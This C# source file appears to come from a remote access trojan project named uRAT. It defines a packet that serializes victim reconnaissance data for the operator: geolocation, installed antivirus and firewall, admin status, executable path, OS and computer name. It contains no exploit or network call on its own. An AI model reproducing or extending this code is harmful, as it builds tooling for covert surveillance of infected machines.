using System;
using System.IO;
using uNet2.Packet;

namespace uRAT.CoreClientPlugin.ExtendedSystemInformation.Packets
{
    class FetchExtendedInformationPacket : IDataPacket
    {
        public int PacketId
        {
            get { return 8; }
        }

        public string CountryCode { get; set; }
        public string CountryName { get; set; }
        public string TimeZone { get; set; }
        public string Latitude { get; set; }
        public string Longitude { get; set; }
        public string InstalledAntivirus { get; set; }
        public string InstalledFirewall { get; set; }
        public string ThisPath { get; set; }
        public string OperatingSystem { get; set; }
        public bool IsAdmin { get; set; }
        public DateTime InstallDate { get; set; }
        public string RunningTime { get; set; }
        public string ComputerName { get; set; }

        public void SerializeTo(Stream stream)
        {
            var bw = new BinaryWriter(stream);
            bw.Write(PacketId);
            bw.Write(CountryCode);
            bw.Write(CountryName);
            bw.Write(TimeZone);
            bw.Write(Latitude);
            bw.Write(Longitude);
            bw.Write(InstalledAntivirus);
            bw.Write(InstalledFirewall);
            bw.Write(ThisPath);
            bw.Write(OperatingSystem);
            bw.Write(IsAdmin);
            bw.Write(InstallDate.ToBinary());
            bw.Write(RunningTime);
            bw.Write(ComputerName);
        }

        public void DeserializeFrom(Stream stream)
        {
       
        }
    }
}
